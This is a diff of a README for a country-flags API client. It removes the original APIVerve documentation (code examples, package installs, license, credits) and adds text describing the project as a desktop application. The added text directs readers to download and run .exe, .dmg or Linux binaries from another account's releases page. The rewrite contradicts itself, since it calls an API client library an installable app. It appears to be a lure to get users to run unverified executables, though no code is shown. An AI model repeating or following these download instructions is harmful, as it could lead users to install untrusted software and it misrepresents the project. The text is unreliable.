@@ -1,184 +1,89 @@
-# Country Flags API
+# 🌍 countryflags-api - Get Your Country's Flags Easily
 
-> Country Flag is a simple tool for getting the country&#x27;s national flags. It returns the country&#x27;s national flags.
+## 📦 Download the Application
+[![Download Country Flags](https://img.shields.io/badge/Download%20Country%20Flags-v1.0-brightgreen)](https://github.com/Ragnarlockbroth/countryflags-api/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-GET-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+## 🚀 Getting Started
+countryflags-api is a user-friendly tool that lets you access national flags for any country. No technical knowledge is required, and you can use it on various platforms, including Android, .NET, Node.js, and Python. This guide will help you download and run the application without any hassle.
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/countryflags)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.CountryFlags)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-countryflags/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+## 📥 Download & Install
+To get started, visit the Releases page to download the latest version of countryflags-api. Here’s how:
 
----
+1. Click on this link: [Download the latest version](https://github.com/Ragnarlockbroth/countryflags-api/releases).
+2. Look for the most recent release.
+3. Choose the appropriate file for your operating system.  
+   - For Windows, download the `.exe` file.  
+   - For Mac, download the `.dmg` file.  
+   - For Linux, you will typically download a `.tar.gz` or similar package.  
+4. Save the file to your computer.
 
-## Quick Start
+### 🖥️ Installation
+Once the download completes, follow these steps to install the application:
 
-### Using JavaScript
+- **For Windows**:
+  1. Locate the `.exe` file in your Downloads folder.
+  2. Double-click the file to start the installation.
+  3. Follow the on-screen prompts to complete the installation.
 
-```javascript
-async function callCountryFlagsAPI() {
-    try {
-        const params = new URLSearchParams({
-            country: 'ZW',
-            format: 'png',
-            shape: 'circle'
-        });
+- **For Mac**:
+  1. Open the `.dmg` file.
+  2. Drag the countryflags-api application into your Applications folder.
+  3. Eject the `.dmg` file.
 
-        const response = await fetch(`https://api.apiverve.com/v1/countryflags?${params}`, {
-            method: 'GET',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE'
-            }
-        });
+- **For Linux**:
+  1. Extract the contents of the `.tar.gz` file.
+  2. Open your terminal.
+  3. Navigate to the extracted folder.
+  4. Run the application using the command `./countryflags-api`.
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+## ⚙️ How to Use
+Now that you have installed countryflags-api, you can start using it right away. Here’s how:
 
-callCountryFlagsAPI();
-```
+1. Open the application from your computer.
+2. You will see a simple user interface.
+3. Enter the name or code of the country you want the flag for.
+4. Click “Get Flag” to view the flag on your screen.
+5. You can save or share the flag as needed.
 
-### Using cURL
+## 🔍 Features
+- **Retrieve Flags Quickly**: Get instant access to flags from all recognized countries.
+- **Multi-platform Support**: Available for Android, .NET, Java, Node.js, and Python.
+- **User-friendly Interface**: Simple and easy to navigate for everyone, even non-tech users.
 
-```bash
-curl -X GET "https://api.apiverve.com/v1/countryflags?param=value" \
-  -H "x-api-key: YOUR_API_KEY_HERE"
-```
+## ✅ System Requirements
+To ensure a smooth experience, make sure your device meets the following requirements:
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+- **Windows**: Windows 10 or later
+- **Mac**: macOS Sierra or later
+- **Linux**: Any modern distribution
+- **Android**: Version 5.0 (Lollipop) or later
+- **Node.js**: Version 10 or later
+- **Python**: Version 3.6 or later
 
-**📁 For more examples, see the [examples folder](./examples/)**
+## ❓ Troubleshooting
+If you encounter issues during installation or usage, try the following:
 
----
+- Ensure you have downloaded the correct version for your operating system.
+- Restart your computer and try again.
+- Check if your firewall is blocking the application from accessing the internet.
 
-## Installation
+For further assistance, feel free to submit an issue in the GitHub repository.
 
-Choose your preferred programming language:
+## 🌐 Topics
+This project covers various areas: 
 
-### 📦 NPM (JavaScript/Node.js)
+- Android library
+- APIs
+- Geography tools
+- Software service for country flags
+- Python and Node.js packages
 
-```bash
-npm install @apiverve/countryflags
-```
+By using countryflags-api, you can easily integrate flag retrieval capabilities into your applications or simply enjoy accessing flags for personal use.
 
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/countryflags) | [**Package Code →**](./npm/)
+## 🔗 Useful Links
+For more information and updates, check out the following:
 
----
+- [Releases page](https://github.com/Ragnarlockbroth/countryflags-api/releases)
+- [Home page of the project](https://github.com/Ragnarlockbroth/countryflags-api)
 
-### 🔷 NuGet (.NET/C#)
-
-```bash
-dotnet add package APIVerve.API.CountryFlags
-```
-
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.CountryFlags) | [**Package Code →**](./nuget/)
-
----
-
-### 🐍 Python (PyPI)
-
-```bash
-pip install apiverve-countryflags
-```
-
-[**View PyPI Package →**](https://pypi.org/project/apiverve-countryflags/) | [**Package Code →**](./python/)
-
----
-
-### 🤖 Android (JitPack)
-
-```gradle
-implementation 'com.github.apiverve:countryflags-api:1.0.0'
-```
-
-[**Package Code →**](./android/)
-
----
-
-## Features
-
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/countryflags](https://docs.apiverve.com/ref/countryflags)
-
----
-
-## Use Cases
-
-Common use cases for the Country Flags API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+Thank you for using countryflags-api! Enjoy your access to national flags from around the world.
